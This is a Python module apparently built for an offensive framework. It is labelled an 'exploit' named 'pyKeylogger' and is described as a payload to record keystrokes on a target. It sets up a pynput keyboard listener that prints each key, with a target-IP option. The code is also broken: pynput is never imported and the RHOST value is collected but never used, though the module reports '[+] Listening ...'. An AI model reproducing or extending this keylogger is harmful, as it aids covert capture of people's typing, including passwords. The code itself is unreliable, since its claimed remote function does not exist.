import pyfiglet
from collections import OrderedDict

MODULE_TYPE = "exploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'pyKeylogger',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'Payload to record keys strokes on on Target',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('RHOST', ('', False,'Enter target IP')),
           
               
                ])
                }
    def logo(self):
    	title = 'pyKeylogger'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <ip_address> , then run")
   
    def on_press(self,key):
      try:
        print(f"Key pressed: {key.char}")
      except AttributeError:
        print(f"Special key pressed: {key}")    
    def keylogger(self,host=None):
      listener = pynput.keyboard.Listener(on_press=self.on_press)
      listener.start()
      listener.join()
    def execute(self):
        self.logo()
        host = self.info['Options']['RHOST'][0]
        self.keylogger(host=None)
        
        return f"[+] Listening ..."
    